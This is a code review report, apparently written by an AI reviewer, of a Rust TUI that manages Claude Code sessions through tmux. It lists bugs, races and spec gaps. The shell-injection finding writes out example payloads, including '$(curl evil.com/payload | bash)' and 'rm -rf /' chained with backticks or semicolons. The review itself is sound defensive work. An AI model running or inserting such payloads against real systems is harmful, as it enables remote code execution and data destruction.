# Adversarial Code Review: Herald TUI

**Date**: 2026-04-05
**Reviewer**: Claude Opus 4.6 (adversarial mode)
**Scope**: Full codebase (~3,300 lines Rust + bash hook script)
**Methodology**: Assume every line is wrong until proven otherwise.

---

## Summary Table

| # | Severity | Category | File | Summary |
|---|----------|----------|------|---------|
| 1 | **CRITICAL** | Async/Sync mismatch | `main.rs`, `app.rs`, `manager.rs` | Async methods called from sync context; code will not compile |
| 2 | **CRITICAL** | Shell injection | `manager.rs:59-65` | User prompt injected into shell command via tmux `send-keys` |
| 3 | **CRITICAL** | Missing architecture | `main.rs:172-194` | No hook listener started; events never received |
| 4 | **CRITICAL** | Missing architecture | `main.rs`, `tmux/control.rs` | tmux control mode never started; terminal buffers never populated |
| 5 | **HIGH** | Panic path | `terminal.rs:119` | `rows - 1` underflows when `rows == 0` |
| 6 | **HIGH** | Panic path | `terminal.rs:214` | VTE params cast panics on subparam lists |
| 7 | **HIGH** | TOCTOU | `main.rs:32-39` | Race between `exists()` check and `create_dir_all` |
| 8 | **HIGH** | Resource leak | `manager.rs`, `hook_listener.rs` | Socket listeners never started; sockets never cleaned on kill |
| 9 | **HIGH** | Spec divergence | `manager.rs:59` | Incomplete shell escaping; only double-quotes escaped |
| 10 | **HIGH** | State machine bug | `app.rs:96-109` | NeedsAttention -> Running transition missing |
| 11 | **MEDIUM** | Silent data loss | `hook_listener.rs:82` | Channel send failure silently dropped |
| 12 | **MEDIUM** | Security | `manager.rs:167-172` | Session ID and socket path not shell-escaped in hook command |
| 13 | **MEDIUM** | Octal decode bug | `control.rs:35-46` | Lone backslash at end-of-string silently dropped |
| 14 | **MEDIUM** | Priority queue logic | `queue.rs:99-105` | Fairness cooldown blocks NEW events, not just re-entries |
| 15 | **MEDIUM** | Spec divergence | Queue | Missing 30-second fallback timeout for permission resolution |
| 16 | **MEDIUM** | Spec divergence | Sidebar | Missing aging indicator (30s blinking), missing Ctrl-n binding |
| 17 | **MEDIUM** | Resource leak | `main.rs` | Log files accumulate without bound |
| 18 | **MEDIUM** | Hook script | `herald-hook.sh:55-57` | `socat` dependency not checked; silent total failure |
| 19 | **LOW** | Zombie processes | `manager.rs:83-92` | `kill` removes session from map but tmux pane may survive |
| 20 | **LOW** | Memory | `terminal.rs:132-134` | Scrollback uses `Vec::remove(0)` -- O(n) per scroll |
| 21 | **LOW** | UX bug | `app.rs:151-153` | Sidebar index can exceed session count after session removal |
| 22 | **LOW** | Hook script | `herald-hook.sh:46-49` | Buffer truncation races with concurrent hook writes |
| 23 | **LOW** | Duplicate types | `queue.rs` vs `model.rs` | Two separate `AttentionReason` enums with divergent fields |

---

## 1. CRITICAL: Async/Sync Mismatch -- Code Cannot Compile As-Is

**Files**: `src/main.rs:147-158`, `src/app.rs:231`, `src/session/manager.rs:31-80`

The `SessionManager` methods `ensure_tmux_session()`, `launch()`, `discover_existing()`, and `kill()` are all `async fn`. However, they are called from synchronous contexts:

```rust
// main.rs:147 -- called outside of async context in the run_loop
match app.session_manager.ensure_tmux_session() {  // async fn!
    Ok(()) => {
        if let Ok(discovered) = app.session_manager.discover_existing() {  // async fn!
```

```rust
// app.rs:231 -- called from handle_dialog_key, which is sync
match self.session_manager.launch(&nickname, &prompt, &working_dir) {  // async fn!
```

These calls are missing `.await` and would not compile. The `run_loop` function IS async, but the discovery code at lines 147-158 runs before the loop, in a context where `app` is `&mut App`. The `handle_dialog_key` call chain is entirely synchronous (`handle_key` -> `handle_dialog_key` -> `session_manager.launch()`).

**Impact**: The project either does not compile, or there is a different version of these methods that is synchronous. If the intent is to have sync wrappers, they are missing.

**Fix**: Either make `launch`/`discover_existing`/`ensure_tmux_session` synchronous (using `std::process::Command` directly instead of `tokio::task::spawn_blocking`), or restructure the event loop to handle async operations via channels or `tokio::spawn`.

---

## 2. CRITICAL: Shell Injection via User Prompt

**File**: `src/session/manager.rs:59-65`

```rust
let escaped_prompt = prompt.replace('"', "\\\"");
let cmd = format!(
    "cd {} && claude --worktree -p \"{}\"",
    working_dir.display(),
    escaped_prompt
);
commands::send_keys(&pane_id, &cmd).await?;
```

The escaping is woefully incomplete. Only double-quotes are escaped. An attacker-controlled prompt containing:

- Backticks: `` `rm -rf /` ``
- `$(...)` command substitution: `$(curl evil.com/payload | bash)`
- Semicolons: `"; rm -rf / ; echo "`
- Single quotes that break out of context
- Backslashes that cancel the escape: `\" ; malicious ; \"`

Additionally, `working_dir.display()` is not quoted at all -- a directory with spaces or shell metacharacters breaks the command entirely.

**Impact**: Any user input in the "Prompt" dialog field is executed as a shell command inside the tmux pane.

**Fix**: Use `tmux send-keys` with literal key sequences instead of constructing a shell command string. Alternatively, write the prompt to a temp file and have the command read from it: `claude --worktree -p "$(cat /tmp/herald/<id>.prompt)"`.

---

## 3. CRITICAL: Hook Listeners Never Started

**File**: `src/main.rs:172-194`, `src/events/hook_listener.rs`

The main event loop is:

```rust
async fn run_loop(...) -> Result<()> {
    loop {
        terminal.draw(|frame| { app.render(...); })?;
        if event::poll(Duration::from_millis(50))? {
            if let Event::Key(key) = event::read()? {
                app.handle_key(key);
            }
        }
        if app.should_quit { break; }
    }
    Ok(())
}
```

There is NO code that:
1. Creates `HookListener` instances for sessions
2. Calls `HookListener::listen()` to start accepting socket connections
3. Drains buffered events on startup
4. Routes received `HookEvent`s to `app.handle_hook_event()`

The `HookListener` type exists and is well-tested, but it is never instantiated or spawned anywhere in the application. The entire hook event pipeline is dead code.

**Impact**: The priority queue will never receive any events. Sessions will stay in "Starting" status forever. The core value proposition of the TUI (attention surfacing) does not function.

**Fix**: After launching a session, spawn a `tokio::spawn` task that calls `listener.listen(tx)` and feed received events into the app state. This requires restructuring the main loop to poll both crossterm events and an `mpsc::Receiver<HookEvent>`.

---

## 4. CRITICAL: tmux Control Mode Never Started

**Files**: `src/tmux/control.rs`, `src/main.rs`

The spec (Section 2.2) describes using `tmux -CC` (control mode) as a subprocess to stream `%output` events to terminal buffers in real-time. The `ControlParser` and `ControlEvent` types are implemented and tested.

However, no code ever:
1. Spawns a `tmux -CC attach -t herald` subprocess
2. Reads its stdout line-by-line
3. Feeds lines through `ControlParser::feed_line()`
4. Routes `ControlEvent::Output` data to `session.terminal.process()`

The terminal buffers will always be blank. The main area will never show any session output.

**Impact**: The TUI renders empty terminal buffers for all sessions. Combined with finding #3, the application is a non-functional shell.

---

## 5. HIGH: Panic on Zero-Size Terminal Buffer

**File**: `src/session/terminal.rs:119`

```rust
pub fn resize(&mut self, cols: u16, rows: u16) {
    // ...
    self.cursor_row = self.cursor_row.min(rows - 1);  // PANICS if rows == 0
    self.cursor_col = self.cursor_col.min(cols - 1);   // PANICS if cols == 0
}
```

If `resize(0, 0)` or `resize(x, 0)` is called, `rows - 1` underflows a `u16`, wrapping to 65535 in debug mode (panic) or producing a nonsensical value in release.

Same issue in `csi_dispatch` for CUD ('B'), CUF ('C'), CUP ('H'/'f'):

```rust
// terminal.rs:225
*self.cursor_row = (*self.cursor_row + n).min(self.rows - 1);  // panics if rows == 0
```

**Impact**: Terminal resize to zero dimensions (e.g., during window minimization) crashes the process.

**Fix**: Use `self.rows.saturating_sub(1)` or guard with `if rows == 0 { return; }`.

---

## 6. HIGH: VTE Params Casting May Panic

**File**: `src/session/terminal.rs:214`

```rust
let params: Vec<u16> = params.iter().map(|p| p[0]).collect();
```

`vte::Params::iter()` yields subparam slices (`&[u16]`). Indexing `p[0]` panics if a subparam slice is empty. While VTE typically guarantees at least one element per param group, this is an implementation detail -- a malicious or malformed escape sequence could trigger this.

Additionally, VTE params are `u16`, but the code then uses these as row/column values. A CSI sequence with params > 65535 would overflow before even reaching this code (VTE already caps at u16), but values near u16::MAX combined with arithmetic like `params.first().copied().unwrap_or(1).max(1) - 1` could produce unexpected large cursor positions that exceed grid dimensions. The `.min(self.rows - 1)` guards prevent out-of-bounds access but the arithmetic is fragile.

---

## 7. HIGH: TOCTOU Race in Runtime Directory Setup

**File**: `src/main.rs:30-39`

```rust
fn ensure_runtime_dir(dir: &PathBuf) -> Result<()> {
    if !dir.exists() {                              // CHECK
        std::fs::create_dir_all(dir)?;              // USE (race window)
        std::fs::set_permissions(dir, ...0o700)?;   // SET (second race window)
    }
```

Between `exists()` returning false and `create_dir_all` executing, another process could create the directory with different permissions or ownership. Between `create_dir_all` and `set_permissions`, the directory exists with default permissions (potentially world-readable).

**Impact**: On multi-user systems, an attacker could pre-create the directory with a symlink to a controlled location, or create it with permissive permissions and access sockets before permissions are tightened.

**Fix**: Use `create_dir_all` unconditionally, then always verify ownership and permissions. Or use `mkdir` with mode in a single atomic operation via `libc::mkdir`.

---

## 8. HIGH: Socket Listeners Never Started; Incomplete Cleanup on Kill

**File**: `src/session/manager.rs:39-80, 82-93`

When a session is launched, no `HookListener` is created and no socket listener is started. The socket file is never actually created -- only the *path* is written into the hook config. When the hook script runs and tries to connect to the socket, `socat` fails silently.

On session kill:

```rust
pub async fn kill(&mut self, session_id: &str) -> Result<()> {
    if let Some(session) = self.sessions.get(session_id) {
        let _ = commands::kill_window(TMUX_SESSION_NAME, &session.nickname).await;
        let _ = tokio::fs::remove_file(rt_dir.join(format!("{}.sock", sid))).await;
        let _ = tokio::fs::remove_file(rt_dir.join(format!("{}.buffer", sid))).await;
    }
    self.sessions.remove(session_id);
    Ok(())
}
```

Missing cleanup:
- The `.lock` file from the hook script is never removed
- The `.claude/settings.local.json` hook config is never cleaned up from the working directory
- If a socket listener WERE running, there is no cancellation token to stop it

---

## 9. HIGH: Incomplete Shell Escaping in Prompt

**File**: `src/session/manager.rs:59`

```rust
let escaped_prompt = prompt.replace('"', "\\\"");
```

This only escapes double-quotes. Missing escapes for:
- `$` (variable expansion): `$HOME` becomes `/Users/vikas`
- `` ` `` (command substitution): `` `whoami` `` executes
- `\` (backslash): `\n` becomes a literal newline
- `!` (history expansion in some shells)

This is distinct from finding #2 (shell injection) -- even without malicious intent, normal prompts containing `$variable`, backticks, or backslashes will be mangled.

---

## 10. HIGH: NeedsAttention -> Running Transition Blocked

**File**: `src/app.rs:96-109`

```rust
crate::events::types::HookEventName::PostToolUse
| crate::events::types::HookEventName::PreToolUse
| crate::events::types::HookEventName::Notification => {
    // Only update to Running if currently in a resolved state
    if matches!(session.status, SessionStatus::Starting) {
        session.status = SessionStatus::Running { ... };
    } else if matches!(session.status, SessionStatus::Running { .. }) {
        session.status = SessionStatus::Running { ... };
    }
}
```

If a session is in `NeedsAttention` state (e.g., after a permission prompt is resolved), and a `PostToolUse` or `PreToolUse` event arrives, the session stays in `NeedsAttention` forever because neither `Starting` nor `Running` matches. The spec says:

> `Created -> Starting -> Running -> [NeedsAttention] -> Running -> ... -> Stopped`

The transition from `NeedsAttention` back to `Running` is never taken. The session appears permanently stuck.

**Fix**: Add a third condition:

```rust
} else if matches!(session.status, SessionStatus::NeedsAttention { .. }) {
    session.status = SessionStatus::Running { last_activity: Instant::now() };
}
```

---

## 11. MEDIUM: Silent Event Loss on Channel Full

**File**: `src/events/hook_listener.rs:82`

```rust
let _ = tx.send(event).await;
```

If the channel is full or the receiver is dropped, the event is silently discarded. For permission requests, this means the user never sees that a session needs attention.

**Fix**: Log a warning on send failure. Consider using an unbounded channel or a bounded channel with a large capacity plus backpressure logging.

---

## 12. MEDIUM: Session ID and Paths Not Shell-Escaped in Hook Config

**File**: `src/session/manager.rs:167-172`

```rust
let herald_cmd = format!(
    "CLAUDE_SESSION_ID={} HERALD_SOCKET={} bash {}",
    session_id,
    socket_path.display(),
    hook_script.display()
);
```

While `session_id` is a UUID (safe), `socket_path` and `hook_script` paths could contain spaces or shell metacharacters (e.g., if `$TMPDIR` contains spaces, which is rare but possible on macOS). None of these values are quoted.

**Fix**: Wrap each value in single quotes with proper escaping:
```rust
format!(
    "CLAUDE_SESSION_ID='{}' HERALD_SOCKET='{}' bash '{}'",
    session_id, socket_path.display(), hook_script.display()
)
```

---

## 13. MEDIUM: Octal Decode Bug for Trailing Backslash

**File**: `src/tmux/control.rs:35`

```rust
if bytes[i] == b'\\' && i + 3 < bytes.len() {
```

The condition `i + 3 < bytes.len()` means the last 3 bytes of input are never checked for escape sequences. If the input ends with `\012`, where `\` is at position `len-4`, `0` at `len-3`, `1` at `len-2`, `2` at `len-1`: then `i + 3 = len - 1`, which is NOT `< len`, so the condition fails and the backslash is emitted as a literal byte.

The correct check is `i + 3 <= bytes.len() - 1`, equivalently `i + 4 <= bytes.len()`.

Wait -- `i + 3 < bytes.len()` means `i+3` must be a valid index, i.e., `i+3 <= bytes.len()-1`. That IS `i + 4 <= bytes.len()`. Let me re-check:

If `bytes.len() == 4` and `i == 0`: `i + 3 = 3 < 4` is true. We access `bytes[1]`, `bytes[2]`, `bytes[3]` -- all valid. This is correct.

If `bytes.len() == 4` and `i == 1`: `i + 3 = 4 < 4` is false. We'd need `bytes[2]`, `bytes[3]`, `bytes[4]` -- `bytes[4]` would be out of bounds. Correctly rejected.

Actually the check is correct. However, a **lone backslash** at positions where fewer than 3 bytes follow is silently emitted as a literal `\` byte. If tmux sends `\` followed by fewer than 3 octal digits (which violates the protocol spec), the backslash passes through unescaped. This is a minor protocol robustness issue rather than a bug.

Downgrading to **LOW**. The more concerning case: if the encoded data contains a literal backslash followed by 3 ASCII digits that are NOT an intended escape (should be `\134` for `\`), the decoder will incorrectly interpret it as an octal escape. But tmux guarantees that `\` is always encoded as `\134`, so this shouldn't arise in practice.

---

## 14. MEDIUM: Fairness Cooldown Blocks First-Time Events After Resolution

**File**: `src/events/queue.rs:99-105`

```rust
let tier_key = (event.session_id.clone(), priority);
if let Some(&last_time) = self.last_entry_time.get(&tier_key) {
    if now.duration_since(last_time) < self.fairness_cooldown {
        return false; // Cooldown not expired
    }
}
```

The `last_entry_time` is set when an event enters the queue (line 148), but is never cleared when an event is resolved. This means after a permission prompt is resolved via `PostToolUse`, the session cannot enter the High priority tier again for 5 seconds, even though the first entry was properly resolved.

In a fast Claude Code session, a second permission prompt arriving within 5 seconds of the first one being GRANTED will be silently dropped from the queue. The user will never see it.

**Impact**: Missed permission prompts in fast-moving sessions.

**Fix**: Clear `last_entry_time` when an entry is resolved, or use `entered_at` from the entry rather than a separate timestamp.

---

## 15. MEDIUM: Spec Divergence -- Missing 30-Second Permission Fallback

**Spec Section 3.2**:
> Fallback: if no `tool_use_id` match within 30 seconds, clear on any `PostToolUse` from the same session.

The implementation in `queue.rs:153-172` resolves permissions by exact `tool_use_id` match, with a fallback of clearing on ANY `PostToolUse` if either ID is `None`. But there is no 30-second timeout fallback. If a `PermissionRequest` has `tool_use_id: Some("t1")` and the resolving `PostToolUse` arrives with `tool_use_id: Some("t2")` (mismatched IDs), the permission prompt sits in the queue forever -- the spec says it should be cleared after 30 seconds on any PostToolUse.

---

## 16. MEDIUM: Multiple Spec Divergences in UI

**Missing features specified in docs/spec.md**:

1. **Section 3.2 -- Aging indicator**: "After 30 seconds in the queue without being addressed, a session's entry gets a visual indicator (blinking/highlight)." Not implemented.

2. **Section 5.1 -- Ctrl-n binding**: "Jump to next queued (needs-attention) session." Not implemented -- `Ctrl-n` is not handled anywhere.

3. **Section 5.1 -- `k` for kill**: The spec says `k` kills the selected session, but in the code `k` moves the sidebar selection up (vim movement). Conflicting keybinding.

4. **Section 5.1 -- `r` for rename**: Not implemented.

5. **Section 5.2 -- Timer display**: Sidebar should show "12s" for how long attention has been needed. Not implemented.

6. **Section 5.2 -- Last tool name**: Sidebar should show "Edit..." for running sessions. Not implemented.

7. **Section 4.5 -- Orphan pane handling**: "For any pane without metadata -> treat as orphan, show in sidebar as 'unknown session'." Not implemented.

8. **Section 4.5 -- Stale socket cleanup**: "For any socket without a matching pane -> clean up stale socket and buffer files." Not implemented.

---

## 17. MEDIUM: Unbounded Log File Accumulation

**File**: `src/main.rs:96-112`

Each herald run creates a new timestamped log file. There is no rotation or cleanup. Over time, the `~/.local/share/herald/logs/` directory will accumulate files indefinitely.

**Fix**: Add log rotation -- delete files older than N days or keep only the last N files.

---

## 18. MEDIUM: Hook Script Depends on `socat` Without Checking

**File**: `scripts/herald-hook.sh:55-57`

```bash
if [ -n "$SOCKET" ] && [ -S "$SOCKET" ]; then
    echo "$EVENT" | socat - UNIX-CONNECT:"$SOCKET" 2>/dev/null || true
fi
```

If `socat` is not installed, this fails silently (`|| true`). The event is written to the buffer file, but never delivered to the socket. Since the TUI currently doesn't even start socket listeners (finding #3), this is doubly broken -- but if the listener were fixed, the dependency on `socat` would need to be documented or replaced.

Alternative: Use bash built-in `/dev/tcp` or Python's `socket` module as a fallback, similar to how `redact_event` has fallbacks.

---

## 19. LOW: tmux Pane May Survive Session Kill

**File**: `src/session/manager.rs:83-92`

```rust
pub async fn kill(&mut self, session_id: &str) -> Result<()> {
    if let Some(session) = self.sessions.get(session_id) {
        let _ = commands::kill_window(TMUX_SESSION_NAME, &session.nickname).await;
```

`kill_window` targets by window *name*, not pane ID. If the user manually renamed the tmux window, or if two sessions share the same nickname (no uniqueness check), the wrong window could be killed or the kill could fail silently (the error is swallowed by `let _`).

**Fix**: Kill by pane ID instead: `tmux kill-pane -t <pane_id>`.

---

## 20. LOW: O(n) Scrollback Eviction

**File**: `src/session/terminal.rs:131-134`

```rust
fn scroll_up(grid: &mut Vec<Vec<Cell>>, ...) {
    let top_row = grid.remove(0);       // O(n) -- shifts entire grid
    scrollback.push(top_row);
    if scrollback.len() > max_scrollback {
        scrollback.remove(0);           // O(n) -- shifts entire scrollback
    }
    grid.push(vec![Cell::default(); cols as usize]);
}
```

Both `grid.remove(0)` and `scrollback.remove(0)` are O(n) operations. With `max_scrollback = 10,000` and a terminal width of 200 columns, each scroll operation shifts ~2MB of data.

**Fix**: Use `VecDeque` instead of `Vec` for both `grid` and `scrollback`. `VecDeque::pop_front()` is O(1).

---

## 21. LOW: Sidebar Index Desync After Session Removal

**File**: `src/app.rs:151-153`

```rust
KeyCode::Char('j') | KeyCode::Down => {
    let count = self.session_manager.session_count();
    if count > 0 {
        self.sidebar_index = (self.sidebar_index + 1) % count;
    }
}
```

If a session is removed (e.g., via kill), `session_count()` decreases but `sidebar_index` is never clamped. If `sidebar_index` was 3 and count drops to 2, the next j/k operation wraps modularly but `session_ids().get(self.sidebar_index)` at line 164 could return `None` (index 3 on a vec of length 2). The code handles this gracefully (the `if let Some(...)` guard), but the visible selection highlight in the sidebar would point at nothing.

**Fix**: Clamp `sidebar_index` to `count.saturating_sub(1)` whenever sessions are modified.

---

## 22. LOW: Hook Script Buffer Truncation Race

**File**: `scripts/herald-hook.sh:46-49`

```bash
if [ "$LINE_COUNT" -gt 500 ]; then
    tail -n 500 "$BUFFER" > "${BUFFER}.tmp" && mv "${BUFFER}.tmp" "$BUFFER"
fi
```

This runs inside the flock block, but the flock is on `${BUFFER}.lock`, while `drain_buffer()` in Rust uses `tokio::fs::rename` on the buffer file itself (not acquiring the flock). A race:

1. Hook script holds flock, reads `$BUFFER`, writes `.tmp`
2. Rust `drain_buffer()` renames `$BUFFER` to `.draining`
3. Hook script does `mv ${BUFFER}.tmp $BUFFER` -- creates a NEW buffer file
4. Rust reads from `.draining` (old data) -- OK
5. But the new buffer file from step 3 has data that will never be drained (the rename already happened)

This is a minor data loss window during buffer drain operations.

---

## 23. LOW: Duplicate AttentionReason Enum

**Files**: `src/events/queue.rs:8-17` vs `src/session/model.rs:17-22`

Two separate `AttentionReason` enums exist with different shapes:

```rust
// queue.rs
pub enum AttentionReason {
    PermissionPrompt { tool_name: String, tool_use_id: Option<String> },
    ToolError { tool_name: String },
    Completed,
}

// model.rs
pub enum AttentionReason {
    PermissionPrompt { tool_name: String },
    ToolError { tool_name: String, error: String },
    Completed,
}
```

The queue version has `tool_use_id` on PermissionPrompt but no `error` on ToolError. The model version has `error` on ToolError but no `tool_use_id`. These represent the same concept but diverge in important ways. Callers must know which one they're working with, and refactoring will eventually misalign them further.

---

## Additional Observations

### Not Yet Implemented (Expected for Early Stage)

- **Key forwarding to tmux pane** (`app.rs:193-195`): Comment says "In a real implementation" -- input never reaches Claude Code sessions.
- **Terminal resize propagation**: No handling of crossterm `Event::Resize` to update terminal buffers or tmux.
- **Session cleanup on quit**: When herald exits, tmux sessions persist (by design per spec), but hook configs in `.claude/settings.local.json` are never cleaned up. Stale hooks will cause errors in future Claude Code runs.
- **PreToolUse hook not configured**: The hook config in `write_hook_config` registers `PermissionRequest`, `PostToolUse`, `PostToolUseFailure`, `Stop`, `Notification` -- but NOT `PreToolUse`. The spec lists it as a hooked event for sidebar status updates.

### Code Quality Notes

- Good test coverage for the components that exist (queue, terminal buffer, control parser, hook listener).
- The attention queue logic is well-designed with proper debounce, fairness, and resolution semantics.
- The terminal buffer VTE implementation handles the common escape sequences correctly.
- The tmux control mode parser correctly handles interleaved %output during %begin blocks.
- The hook script has a solid defense-in-depth approach with jq/python/sed fallbacks for redaction.

### Overall Assessment

The individual components (priority queue, terminal buffer, control parser, hook listener) are well-implemented and well-tested in isolation. The critical gap is the **integration layer** -- nothing wires these components together into a functioning application. The main loop only handles keyboard input and rendering; it never starts socket listeners, never starts tmux control mode, and calls async methods from sync contexts. The application as written is a skeleton with excellent organs but no circulatory system.
